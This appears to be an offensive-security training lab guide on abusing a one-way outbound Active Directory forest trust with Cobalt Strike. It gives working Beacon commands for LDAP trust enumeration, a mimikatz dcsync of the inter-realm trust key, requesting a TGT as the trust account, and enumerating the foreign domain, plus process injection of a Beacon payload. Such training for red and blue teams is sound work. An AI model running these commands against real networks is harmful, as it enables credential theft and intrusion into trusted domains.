

# Introduction



The objective for this lab is to perform enumeration across a one-way outbound trust.

Log into @lab.VirtualMachine(attacker-desktop).SelectLink with the password ```@lab.VirtualMachine(attacker-desktop).Password```.



> [!NOTE]
> @lab.Activity(beacon)

---

1. [ ] Launch Cobalt Strike and connect to the team server.
1. [ ] Interact with Beacon and enumerate the trust.

    ```Beacon-nocolor
    ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatName
    ```

    > [+HELP] What do these results mean?
    >
    > - trustDirection 2 is TRUST_DIRECTION_OUTBOUND.
    > - trustAttributes 8 is TRUST_ATTRIBUTE_FOREST_TRANSITIVE.

1. [ ] Get the GUID of the TDO.

    ```Beacon-nocolor
    ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID
    ```

1. [ ] Inject a Beacon payload into a *vwebber* process.
1. [ ] Use the new Beacon to dcsync the shared inter-realm key from the TDO.

    ```Beacon-nocolor
    mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
    ```

1. [ ] Request a TGT for the trust account using the shared secret.

    ```Beacon-nocolor
    krb_asktgt /user:PARTNER$ /rc4:[TRUST KEY] /domain:contoso.com /dc:lon-dc-1.contoso.com
    ```

1. [ ] Inject the TGT into a sacrificial logon session.

1. [ ] Enumerate the trusted domain.

    ```Beacon-nocolor
    ldapsearch (objectClass=domain) --hostname contoso.com --dn DC=contoso,DC=com --attributes name,objectSid
    ```



> [!KNOWLEDGE] In this lab, you have learned how to abuse the trust account to obtain a usable TGT for the foreign domain. These can be used to find potential vulnerabilities, such as kerberoastable accounts.
